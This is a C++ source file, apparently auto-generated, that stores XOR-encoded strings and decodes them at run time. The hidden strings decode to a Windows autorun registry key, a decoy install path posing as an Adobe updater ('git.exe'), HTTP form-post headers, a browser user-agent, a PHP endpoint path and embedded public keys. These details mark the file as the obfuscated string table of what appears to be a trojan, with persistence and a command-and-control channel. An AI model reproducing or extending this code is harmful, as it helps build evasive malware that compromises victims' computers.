//Auto generated @17/08/2017 19:22

#pragma once
#include "stdafx.h"
#include "cryptedstrings.h"

//Liste des String encodes
static const CryptedStrings::crypted_string_t strings[] =
{
	{196, 4, "\xab\xb4\xa1\xaa"},
	{141, 45, "\xde\xe2\xeb\xf9\xfa\xec\xff\xe8\xd1\xc0\xe4\xee\xff\xe2\xfe\xe2\xeb\xf9\xd1\xda\xe4\xe3\xe9\xe2\xfa\xfe\xd1\xce\xf8\xff\xff\xe8\xe3\xf9\xfb\xe8\xff\xfe\xe4\xe2\xe3\xd1\xdf\xf8\xe3"},
	{212, 10, "\x92\xb5\xa7\xa0\x81\xa4\xb0\xb5\xa0\xb1"},
	{179, 21, "\xf2\xd7\xdc\xd1\xd6\xef\xfe\xd6\xc1\xd4\xd6\xef\xfe\xd6\xc1\xd4\xd6\x9d\xd6\xcb\xd6"},
	{32, 26, "\x61\x44\x4f\x42\x45\x7c\x6d\x45\x52\x47\x45\x7c\x75\x50\x44\x41\x54\x45\x7c\x47\x49\x54\xe\x45\x58\x45"},
	{208, 31, "\x91\xb4\xbf\xb2\xb5\x8c\x9d\xb5\xa2\xb7\xb5\x8c\xb5\xbe\xfd\x95\x9e\x8c\xbd\xb5\xa2\xb7\xb5\x8f\xb5\xbe\xfe\xb9\xe1\xe8\xbe"},
	{1, 4, "\x67\x74\x40\x42"},
	{5, 13, "\x47\x44\x41\x5a\x56\x4c\x42\x4b\x44\x51\x50\x57\x40"},
	{104, 12, "\x3b\x31\x3b\x3c\x2d\x25\x37\x2d\x3a\x3a\x27\x3a"},
	{109, 7, "\x1a\x4\x3\x9\x2\x1a\x1e"},
	{183, 10, "\xda\xd2\xc4\xc4\xd6\xd0\xd2\xd5\xd8\xcf"},
	{119, 9, "\x10\x12\x3\x11\x18\x1b\x13\x12\x5"},
	{164, 21, "\xc7\xd6\xdd\xd4\xd0\xd1\xca\xd4\xd6\xcb\xd0\xc1\xc7\xd0\xcc\xc1\xdc\xc0\xc5\xd0\xc5"},
	{228, 7, "\x97\x95\x88\x8d\x90\x81\xd7"},
	{1, 4, "\x6e\x71\x64\x6f"},
	{106, 8, "\xd\xf\x1e\x1e\xb\x8\x6\xf"},
	{13, 5, "\x6e\x61\x62\x7e\x68"},
	{54, 8, "\x52\x57\x42\x57\x54\x57\x45\x53"},
	{77, 3, "\x2c\x29\x29"},
	{54, 3, "\x54\x4c\x46"},
	{24, 8, "\x6e\x79\x74\x71\x7c\x79\x6c\x7d"},
	{212, 14, "\xbc\xa0\xa0\xa4\xee\xfb\xfb\xb9\xa7\xba\xfa\xb7\xbb\xb9"},
	{243, 7, "\x9b\x87\x87\x83\xc9\xdc\xdc"},
	{213, 8, "\xbd\xa1\xa1\xa5\xa6\xef\xfa\xfa"},
	{185, 2, "\x83\x99"},
	{91, 47, "\x18\x34\x35\x2f\x3e\x35\x2f\x76\xf\x22\x2b\x3e\x61\x7b\x3a\x2b\x2b\x37\x32\x38\x3a\x2f\x32\x34\x35\x74\x23\x76\x2c\x2c\x2c\x76\x3d\x34\x29\x36\x76\x2e\x29\x37\x3e\x35\x38\x34\x3f\x3e\x3f"},
	{31, 113, "\x52\x70\x65\x76\x73\x73\x7e\x30\x2a\x31\x2f\x3f\x37\x48\x76\x71\x7b\x70\x68\x6c\x3f\x51\x4b\x3f\x29\x31\x2e\x24\x3f\x48\x76\x71\x29\x2b\x24\x3f\x67\x29\x2b\x36\x3f\x5e\x6f\x6f\x73\x7a\x48\x7a\x7d\x54\x76\x6b\x30\x2a\x2c\x28\x31\x2c\x29\x3f\x37\x54\x57\x4b\x52\x53\x33\x3f\x73\x76\x74\x7a\x3f\x58\x7a\x7c\x74\x70\x36\x3f\x5c\x77\x6d\x70\x72\x7a\x30\x2b\x2f\x31\x2f\x31\x2d\x2d\x2e\x2b\x31\x27\x2a\x3f\x4c\x7e\x79\x7e\x6d\x76\x30\x2a\x2c\x28\x31\x2c\x29"},
	{87, 4, "\x7\x18\x4\x3"},
	{196, 3, "\x83\x81\x90"},
	{193, 8, "\x89\x95\x95\x91\xee\xf0\xef\xf0"},
	{157, 1, "\xb2"},
	{66, 1, "\x7d"},
	{154, 1, "\xbc"},
	{109, 1, "\x50"},
	{30, 14, "\x31\x70\x7b\x69\x6d\x31\x70\x7b\x69\x6d\x30\x6e\x76\x6e"},
	{30, 17, "\x31\x70\x7b\x69\x6d\x31\x79\x7f\x73\x7b\x7f\x6e\x77\x30\x6e\x76\x6e"},
	{0, 19, "\x2f\x6e\x65\x77\x73\x2f\x63\x68\x61\x72\x61\x63\x74\x65\x72\x2e\x70\x68\x70"},
	{88, 2, "\x31\x3c"},
	{167, 6, "\xd4\xc2\xd5\xd1\xc2\xd5"},
	{233, 10, "\x9a\x8c\x9b\x80\x88\x85\x80\x93\x8c\x8d"},
	{66, 271, "\x6f\x6f\x6f\x6f\x6f\x0\x7\x5\xb\xc\x62\x12\x17\x0\xe\xb\x1\x62\x9\x7\x1b\x6f\x6f\x6f\x6f\x6f\x48\xf\xb\x5\x24\xf\x3\x72\x5\x1\x11\x33\x5\x11\xb\x20\x71\x6\x13\x7\x0\x3\x13\x17\x3\x3\x76\x5\xc\x3\x6\x1\x0\x2b\x13\x9\x0\x25\x13\x1\x1\x0\x77\x73\x1\x29\x2b\x8\x12\x18\x28\x18\x31\x35\x76\x23\x1a\x10\x25\x4\x74\xd\x28\x13\x8\x48\x7b\x35\x2e\x1b\x10\x2c\x73\x77\x7\x12\x33\x10\x69\xe\x26\x31\x31\x2d\xb\x2e\x73\x15\x74\x70\xd\x18\x75\x2c\x2d\x11\x74\x24\x18\x72\xa\x33\x25\x28\x16\xe\x12\x18\x3\x69\x4\x75\x2d\x12\x4\x71\x18\x7b\x9\x2a\x34\x75\x0\x70\x17\x26\x73\x2c\x0\xf\x48\x9\x7a\x70\x2a\x75\x7b\x18\x38\x2f\x1b\x16\x14\x35\x7b\x4\x0\x2d\x9\x31\x31\x25\x6d\x2f\xf\x6\x14\x13\x20\x7\x31\x9\x72\x1a\x6d\x38\x76\x24\x6\x1a\x13\x74\x6d\x6\x31\x3a\x10\x0\x24\x34\x14\x74\x4\x3\xd\x2f\x75\x2c\x30\x33\x20\x30\x3b\x1\x2d\x48\x75\x18\x25\x21\x14\x7b\x69\x14\x20\x11\x3a\x17\x2a\xc\x77\x2d\x75\x13\xb\x6\x3\x13\x3\x0\x48\x6f\x6f\x6f\x6f\x6f\x7\xc\x6\x62\x12\x17\x0\xe\xb\x1\x62\x9\x7\x1b\x6f\x6f\x6f\x6f\x6f"},
	{124, 271, "\x51\x51\x51\x51\x51\x3e\x39\x3b\x35\x32\x5c\x2c\x29\x3e\x30\x35\x3f\x5c\x37\x39\x25\x51\x51\x51\x51\x51\x76\x31\x35\x3b\x1a\x31\x3d\x4c\x3b\x3f\x2f\xd\x3b\x2f\x35\x1e\x4f\x38\x2d\x39\x3e\x3d\x2d\x29\x3d\x3d\x48\x3b\x32\x3d\x38\x3f\x3e\x15\x2d\x37\x3e\x1b\x2d\x3f\x3f\x3e\x49\x4d\x3f\x17\x15\x36\x2c\x26\x16\x26\xf\xb\x48\x1d\x24\x2e\x1b\x3a\x4a\x33\x16\x2d\x36\x76\x45\xb\x10\x25\x2e\x12\x4d\x49\x39\x2c\xd\x2e\x57\x30\x18\xf\xf\x13\x35\x10\x4d\x2b\x4a\x4e\x33\x26\x4b\x12\x13\x2f\x4a\x1a\x26\x4c\x34\xd\x1b\x16\x28\x30\x2c\x26\x3d\x57\x3a\x4b\x13\x2c\x3a\x4f\x26\x45\x37\x14\xa\x4b\x3e\x4e\x29\x18\x4d\x12\x3e\x31\x76\x37\x44\x4e\x14\x4b\x45\x26\x6\x11\x25\x28\x2a\xb\x45\x3a\x3e\x13\x37\xf\xf\x1b\x53\x11\x31\x38\x2a\x2d\x1e\x39\xf\x37\x4c\x24\x53\x6\x48\x1a\x38\x24\x2d\x4a\x53\x38\xf\x4\x2e\x3e\x1a\xa\x2a\x4a\x3a\x3d\x33\x11\x4b\x12\xe\xd\x1e\xe\x5\x3f\x13\x76\x4b\x26\x1b\x1f\x2a\x45\x57\x2a\x1e\x2f\x4\x29\x14\x32\x49\x13\x4b\x2d\x35\x38\x3d\x2d\x3d\x3e\x76\x51\x51\x51\x51\x51\x39\x32\x38\x5c\x2c\x29\x3e\x30\x35\x3f\x5c\x37\x39\x25\x51\x51\x51\x51\x51"}
};

void CryptedStrings::_getA(WORD id, LPSTR buffer)
{
  crypted_string_t *s = (CryptedStrings::crypted_string_t *)&strings[id];
  for(unsigned short i = 0; i < s->size; i++)buffer[i] = (s->encodedString[i] ^ s->key);
  buffer[s->size] = 0;
}

void CryptedStrings::_getW(WORD id, LPWSTR buffer)
{
  crypted_string_t *s = (CryptedStrings::crypted_string_t *)&strings[id];
  for(unsigned short i = 0; i < s->size; i++)buffer[i] = (s->encodedString[i] ^ s->key) & 0xff;
  buffer[s->size] = 0;
}